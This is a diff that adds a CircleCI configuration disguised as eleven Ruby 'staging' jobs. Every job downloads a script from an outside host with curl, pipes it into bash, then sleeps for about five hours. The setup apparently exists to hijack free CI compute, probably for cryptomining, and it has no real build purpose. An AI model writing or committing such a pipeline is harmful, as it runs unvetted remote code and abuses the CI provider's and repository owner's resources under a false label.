@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  rubystaging:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubystaging10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/crayli.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - rubystaging
+      - rubystaging1
+      - rubystaging2
+      - rubystaging3
+      - rubystaging4
+      - rubystaging5
+      - rubystaging6
+      - rubystaging7
+      - rubystaging8
+      - rubystaging9
+      - rubystaging10
